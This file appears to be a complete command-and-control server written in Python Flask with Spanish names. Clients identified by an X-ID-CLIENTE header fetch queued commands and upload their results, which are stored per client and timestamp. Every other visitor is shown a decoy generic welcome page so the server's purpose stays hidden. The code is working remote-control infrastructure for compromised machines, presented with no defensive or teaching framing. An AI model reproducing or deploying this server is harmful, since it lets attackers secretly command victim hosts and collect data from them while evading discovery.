from flask import Flask, request, Response
import os
from datetime import datetime

app = Flask(__name__)

VALID_IDS_FILE = "/data/valid_ids/valid_ids.txt"
COMANDOS_DIR   = "/data/comandos"
RESULTADOS_DIR = "/data/resultados"

def load_valid_ids():
    if not os.path.exists(VALID_IDS_FILE):
        return set()
    with open(VALID_IDS_FILE) as f:
        return set(line.strip() for line in f if line.strip())

def unauthorized():
    return "<html><body><h1>Bienvenido</h1><p>Pagina generica.</p></body></html>", 200

@app.route("/", methods=["GET", "POST", "PUT", "DELETE"])
def handler():
    client_id = request.headers.get("X-ID-CLIENTE", "").strip()

    if not client_id or client_id not in load_valid_ids():
        return unauthorized()

    if request.method == "GET":
        comandos_file = os.path.join(COMANDOS_DIR, client_id, "comandos.txt")
        pending_flag  = os.path.join(COMANDOS_DIR, client_id, "pendiente")

        if not os.path.exists(comandos_file):
            return "Sin comandos.", 404

        if os.path.exists(pending_flag):
            return "Esperando resultado.", 404

        with open(comandos_file) as f:
            comandos = f.read().strip()

        if not comandos:
            return "Sin comandos.", 404

        open(pending_flag, "w").close()
        return Response(comandos, mimetype="text/plain"), 200

    elif request.method == "POST":
        result_dir   = os.path.join(RESULTADOS_DIR, client_id)
        pending_flag = os.path.join(COMANDOS_DIR, client_id, "pendiente")

        os.makedirs(result_dir, exist_ok=True)

        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        result_file = os.path.join(result_dir, f"{ts}.txt")

        with open(result_file, "w") as f:
            f.write(request.get_data(as_text=True))

        if os.path.exists(pending_flag):
            os.remove(pending_flag)
        comandos_file = os.path.join(COMANDOS_DIR, client_id, "comandos.txt")
        if os.path.exists(comandos_file):
            os.remove(comandos_file)

        return "OK", 200

    return "OK", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)